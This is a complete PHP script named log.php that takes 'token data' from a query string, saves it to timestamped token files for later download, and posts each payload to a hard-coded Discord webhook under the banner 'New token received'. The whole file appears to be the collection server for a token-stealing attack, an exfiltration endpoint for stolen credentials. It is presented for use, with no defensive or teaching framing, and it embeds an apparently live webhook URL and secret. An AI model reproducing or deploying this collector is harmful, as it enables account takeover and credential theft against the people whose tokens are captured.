<?php
// log.php – Log incoming token data to a file and forward it to Discord

header('Content-Type: text/plain');

// Grab the data from the query string (e.g. ?data=foo)
$data = $_GET['data'] ?? '';

if ($data) {
    // 1️⃣ Decode the JSON string
    $payload = json_decode($data, true);

    // 2️⃣ Write to a timestamped file (for later download)
    $filename = "tokens_" . date('Y-m-d_H-i-s') . ".txt";
    $toWrite = json_encode($payload, JSON_PRETTY_PRINT) . PHP_EOL . PHP_EOL;
    file_put_contents($filename, $toWrite, FILE_APPEND);

    // 3️⃣ Forward the same payload to Discord (optional)
    $webhook = 'https://discord.com/api/webhooks/1563428362553135104/tg0JKi984kJRddxhYo-VMFxAR8K3-A8nYPEz_kcOEqZK8UShRE7AhwZCiW-w3l2w53Yl';
    $payload_to_webhook = [
        'content' => '⚡ **New token received** ⚡',
        'embeds' => [
            [
                'title' => 'Token Payload',
                'description' => "```\n" . json_encode($payload, JSON_PRETTY_PRINT) . "\n```",
                'color' => 0x00FF00
            ]
        ]
    ];

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload_to_webhook));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);

    // 4️⃣ Tell the browser that everything went OK
    echo "OK";
} else {
    echo "NO DATA";
}
?>
